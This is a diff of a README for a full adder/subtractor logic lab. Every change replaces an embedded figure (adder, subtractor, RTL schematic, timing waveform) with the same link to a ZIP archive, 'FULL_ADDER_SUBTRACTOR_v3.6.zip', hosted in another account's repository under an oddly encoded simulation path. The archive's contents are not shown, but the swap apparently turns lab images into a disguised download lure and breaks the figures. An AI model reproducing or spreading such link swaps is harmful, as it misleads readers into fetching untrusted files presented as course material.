@@ -22,7 +22,7 @@ Sum =A’B’Cin + A’BCin’ + ABCin + AB’Cin’ = A ⊕ B ⊕ Cin
 
 Carry = AB + ACin + BCin
 
-![image](https://github.com/naavaneetha/FULL_ADDER_SUBTRACTOR/assets/154305477/0f30ba51-5ffb-4198-845f-18e054f675e7)
+![image](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)
 
 **Figure -1 FULL ADDER**
 
@@ -30,7 +30,7 @@ Carry = AB + ACin + BCin
 
 A full subtractor is a combinational circuit that performs subtraction involving three bits, namely minuend, subtrahend, and borrow-in . It accepts three inputs: minuend, subtrahend and a borrow bit and it produces two outputs: difference and borrow.
 
-![image](https://github.com/naavaneetha/FULL_ADDER_SUBTRACTOR/assets/154305477/02b24f51-ab51-4304-9ad6-7b81ffc1ead5)
+![image](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)
 
 Diff = A ⊕ B ⊕ Bin 
 
@@ -64,10 +64,10 @@ endmodule
 
 ```
 **RTL Schematic**
-![318706159-254361e2-8d56-499e-a9f6-78a87bfe730f](https://github.com/user-attachments/assets/edc0840e-4439-4675-abf2-d0d19a8dc685)
+![318706159-254361e2-8d56-499e-a9f6-78a87bfe730f](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)
 
 **Output Timing Waveform**
-![318706218-41a89d30-bde2-44fa-809b-3683dee78211](https://github.com/user-attachments/assets/6366f930-0d6f-460a-b62c-7fc6a6738338)
+![318706218-41a89d30-bde2-44fa-809b-3683dee78211](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)
 
 **Result:**
 
